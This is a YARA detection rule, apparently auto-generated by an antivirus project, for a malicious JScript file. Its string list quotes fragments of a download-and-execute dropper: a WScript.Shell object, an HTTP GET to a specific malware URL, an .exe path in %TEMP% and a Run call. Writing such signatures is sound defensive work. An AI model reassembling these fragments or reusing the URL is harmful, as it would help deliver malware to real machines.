rule sig_20160329_2c1bf9ff110e720141187f57076c9e1c {
  meta:
    description = "datamaliciousorder - file 20160329_2c1bf9ff110e720141187f57076c9e1c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2624b8bfb6ae2904ff2b5902b0cae21722cd6f7c5ea643bbf4fa91f874802e30"

  strings:
    $s1  = "function h() {return oG[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qdG5DZ4P.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[mN](y() * 11); if (h0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "var oG = function E() {return WScript[Le](\"WScript.Shell\");}(), v = 11;" fullword ascii
    $s4  = "h0[k](\"GET\", \"http://kingsstaging.consines.in/l9osaw\", false);" fullword ascii
    $s5  = "function uT(y1, Bs){p = p * 1; return y1 - Bs;};" fullword ascii
    $s6  = "function jV(){return \"\" + eQ;};" fullword ascii
    $s7  = "function q() {return ((RV == true) && (RV == vL)) ? 1 : p;};" fullword ascii
    $s8  = "function C(o){oG[\"Run\"](o, p, p);};" fullword ascii
    $s9  = "function L()" fullword ascii
    $s10 = "function y(){return 22;};" fullword ascii
    $s11 = " while (u){" fullword ascii
    $s12 = "var t = new this[\"Date\"]();" fullword ascii
    $s13 = "return uT(B, Vk);" fullword ascii
    $s14 = "function O(){return Le;};" fullword ascii
    $s15 = "function d(Zv) {var nM = (1, 2, 3, 4, 5, Zv); return nM;};" fullword ascii
    $s16 = "var vL = false;" fullword ascii
    $s17 = "RV = true; " fullword ascii
    $s18 = "var RV = false;" fullword ascii
    $s19 = "var d0 = false;" fullword ascii
    $s20 = "vL = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}